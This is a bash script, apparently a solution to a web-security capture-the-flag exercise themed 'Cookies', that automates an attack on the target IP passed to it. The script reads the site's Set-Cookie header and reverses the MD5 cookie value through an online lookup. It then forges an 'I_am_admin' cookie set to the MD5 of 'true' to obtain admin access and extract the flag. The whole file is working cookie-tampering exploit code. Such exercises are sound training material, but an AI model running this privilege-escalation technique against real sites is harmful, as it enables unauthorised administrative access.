#!/bin/bash
#
# ./get-the-cookie-flag.sh "ip"
# 

theme="Cookies"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

function md5_reverse_decode_to_string
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: md5 to reverse
	simplified_curl_request "https://md5.gromweb.com/?" "md5=${1}" | grep -Eo "<input class=\"field\" id=\"form_string_to_hash_string\" type=\"search\" name=\"string\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

function string_encode_to_md5
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: string to md5
	simplified_curl_request "https://md5.gromweb.com/?" "string=${1}" | grep -Eo "<input class=\"field\" id=\"form_hash_to_string_hash\" type=\"search\" name=\"md5\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

echo -e "\n\033[35m4. === ${theme} ===============================================\033[0m\n"

#echo -e "\033[32m"
get_the_cookie=`curl -sI "${1}"  | grep -Eo "Set-Cookie:[^;]*" | awk '{print $2}'`
cookie_name=`echo "${get_the_cookie}" | awk -F= '{print $1}'`
cookie_value=`echo "${get_the_cookie}" | awk -F= '{print $2}'`
echo -e "cookie name: \033[33m${cookie_name}\033[0m"
echo -e "cookie value: \033[33m${cookie_value}\033[0m"
cookie_value=`md5_reverse_decode_to_string "${cookie_value}"`
echo -e "cookie value: \033[33m${cookie_value}\033[0m" # -> value = false
if [ "${cookie_value}" = "false" ]
then
	cookie_value=`string_encode_to_md5 "true"`
	echo -e "cookie value: \033[33mtrue\033[0m" # -> value = true
	echo -e "cookie value: \033[33m${cookie_value}\033[0m" # -> value = true md5
	get_the_cookie="${cookie_name}=${cookie_value}"
	delivery_message=`curl -sj --cookie "${get_the_cookie}" "${1}" | grep -Eo "alert\('[a-zA-Z:\" -_.;!][^<]*"`
	cookie_flag=`echo "${delivery_message}" | grep -Eo ": [0-9a-zA-Z]*"`
	cookie_flag=${cookie_flag:2}

	echo -e "When we manually set the cookie \033[33m\"I_am_admin\"\033[0m to \033[33mtrue\033[0m, we get the following alert:"
	echo -e "\033[31m"${delivery_message}"\033[0m"
	echo -e "The flag earned is: \033[31m"${cookie_flag}"\033[0m"
fi
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
